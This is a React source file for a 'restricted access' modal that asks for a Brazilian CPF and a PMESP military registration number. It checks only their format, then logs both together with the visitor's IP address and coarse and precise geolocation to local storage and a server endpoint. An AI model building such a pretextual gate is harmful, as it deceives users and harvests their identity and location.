'use client';

import { useState, useEffect } from 'react';
import { Shield, ShieldAlert, CheckCircle2, Lock } from 'lucide-react';
import { isValidCPF, isValidRE, formatCPF, formatRE } from '@/lib/validations';

export default function AuthModal() {
  const [cpf, setCpf] = useState('');
  const [re, setRe] = useState('');
  const [cpfError, setCpfError] = useState('');
  const [reError, setReError] = useState('');
  const [isChecking, setIsChecking] = useState(true);
  const [granted, setGranted] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  useEffect(() => {
    // eslint-disable-next-line react-hooks/set-state-in-effect
    setIsChecking(false);
  }, []);

  useEffect(() => {
    if (cpf.length === 14) {
      if (!isValidCPF(cpf)) {
        // eslint-disable-next-line react-hooks/set-state-in-effect
        setCpfError('CPF inválido pelo algoritmo da Receita Federal (Padrão: XXX.XXX.XXX-XX)');
      }
    }
  }, [cpf]);

  useEffect(() => {
    if (re.length === 8) {
      if (!isValidRE(re)) {
        // eslint-disable-next-line react-hooks/set-state-in-effect
        setReError('RE inválido. Falha no Módulo 11 da PMESP (Padrão: XXXXXX-X)');
      }
    }
  }, [re]);

  const handleValidate = async () => {
    let valid = true;
    setCpfError('');
    setReError('');

    if (cpf.length !== 14 || !isValidCPF(cpf)) {
      setCpfError('CPF inválido pelo algoritmo da Receita Federal (Padrão: XXX.XXX.XXX-XX)');
      valid = false;
    }

    if (re.length !== 8 || !isValidRE(re)) {
      setReError('RE inválido. Falha no Módulo 11 da PMESP (Padrão: XXXXXX-X)');
      valid = false;
    }

    if (valid) {
      setIsSuccess(true);
      
      try {
        let ipAddress = 'unknown';
        let locationData: any = {
          city: 'Desconhecido',
          region: '',
          country: '',
          latitude: null,
          longitude: null,
          precise: false,
        };
        
        try {
          // Obtendo IPv4 ou IPv6 real do cliente
          const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
          if (ipRes && ipRes.ok) {
            try {
              const ipData = await ipRes.json();
              if (ipData?.ip) ipAddress = ipData.ip;
            } catch {
              // Ignore non-json response
            }
          }
          
          const geoRes = await fetch('https://ipapi.co/json/').catch(() => null);
          if (geoRes && geoRes.ok) {
            try {
              const geo = await geoRes.json();
              if (ipAddress === 'unknown' && geo?.ip) ipAddress = geo.ip;
              if (geo) {
                locationData.city = geo.city || 'Desconhecido';
                locationData.region = geo.region || '';
                locationData.country = geo.country_name || '';
                locationData.latitude = geo.latitude || null;
                locationData.longitude = geo.longitude || null;
              }
            } catch {
              // Ignore non-json response
            }
          }
        } catch (e) {
          console.error("Failed to fetch geo data", e);
        }

        if ('geolocation' in navigator) {
          try {
            const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, maximumAge: 0 });
            });
            locationData.latitude = pos.coords.latitude;
            locationData.longitude = pos.coords.longitude;
            locationData.precise = true;
          } catch(e) {
            console.log("Precise geolocation denied or timeout", e);
          }
        }

        const logEntry = {
          cpf,
          re,
          ipAddress,
          locationData,
          timestamp: new Date().toISOString()
        };

        // 1. Save to local storage (redundancy)
        const existingLogs = JSON.parse(localStorage.getItem('access_logs') || '[]');
        existingLogs.push(logEntry);
        localStorage.setItem('access_logs', JSON.stringify(existingLogs));

        // 2. Save to database
        await fetch('/api/logs', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(logEntry)
        });

      } catch (error) {
        console.error("Error saving logs", error);
      }

      setTimeout(() => {
        setGranted(true);
      }, 1200);
    }
  };

  if (isChecking || granted) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4">
      <div className="w-full max-w-md bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl p-8 relative overflow-hidden">
        
        {/* Header */}
        <div className="flex flex-col items-center justify-center mb-8">
          <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-4 transition-colors duration-500 ${isSuccess ? 'bg-emerald-500/20 text-emerald-500' : 'bg-slate-800 text-slate-400'}`}>
            {isSuccess ? <CheckCircle2 className="w-8 h-8" /> : <Lock className="w-8 h-8" />}
          </div>
          <h2 className="text-2xl font-bold text-white tracking-tight">Acesso Restrito</h2>
          <p className="text-slate-400 text-sm text-center mt-2">
            Informe suas credenciais funcionais para acessar o sistema.
          </p>
        </div>

        {/* Form */}
        <div className="space-y-5">
          <div>
            <label className="block text-sm font-medium text-slate-300 mb-1.5">
              CPF (Padrão: <span className="font-mono text-cyan-400">XXX.XXX.XXX-XX</span>)
            </label>
            <input
              type="text"
              value={cpf}
              maxLength={14}
              onChange={(e) => {
                setCpf(formatCPF(e.target.value));
                if (cpfError) setCpfError('');
              }}
              placeholder="000.000.000-00"
              className={`w-full px-4 py-3 bg-slate-950 border rounded-xl text-white font-mono placeholder-slate-600 focus:outline-none focus:ring-1 transition-all ${
                cpfError 
                  ? 'border-red-500 focus:border-red-500 focus:ring-red-500' 
                  : 'border-slate-800 focus:border-slate-600 focus:ring-slate-600'
              }`}
            />
            {cpfError && (
              <p className="text-red-400 text-xs mt-2 flex items-center gap-1">
                <ShieldAlert className="w-3 h-3" />
                {cpfError}
              </p>
            )}
          </div>

          <div>
            <label className="block text-sm font-medium text-slate-300 mb-1.5">
              RE Militar (Padrão: <span className="font-mono text-cyan-400">XXXXXX-X</span> • Módulo 11 PMESP)
            </label>
            <input
              type="text"
              value={re}
              maxLength={8}
              onChange={(e) => {
                setRe(formatRE(e.target.value));
                if (reError) setReError('');
              }}
              placeholder="Ex: 123456-7"
              className={`w-full px-4 py-3 bg-slate-950 border rounded-xl text-white font-mono placeholder-slate-600 focus:outline-none focus:ring-1 transition-all uppercase ${
                reError 
                  ? 'border-red-500 focus:border-red-500 focus:ring-red-500' 
                  : 'border-slate-800 focus:border-slate-600 focus:ring-slate-600'
              }`}
            />
            {reError && (
              <p className="text-red-400 text-xs mt-2 flex items-center gap-1">
                <ShieldAlert className="w-3 h-3" />
                {reError}
              </p>
            )}
          </div>
        </div>

        {/* Button */}
        <div className="mt-8">
          <button
            onClick={handleValidate}
            disabled={isSuccess}
            className={`w-full py-3.5 rounded-xl font-semibold flex items-center justify-center gap-2 transition-all duration-300 ${
              isSuccess 
                ? 'bg-emerald-500 hover:bg-emerald-600 text-white shadow-[0_0_20px_rgba(16,185,129,0.3)]' 
                : 'bg-red-500/90 hover:bg-red-500 text-white'
            }`}
          >
            {isSuccess ? (
              <>
                <CheckCircle2 className="w-5 h-5" />
                Acesso Liberado
              </>
            ) : (
              <>
                <ShieldAlert className="w-5 h-5" />
                Validar e Acessar
              </>
            )}
          </button>
        </div>
        
      </div>
    </div>
  );
}
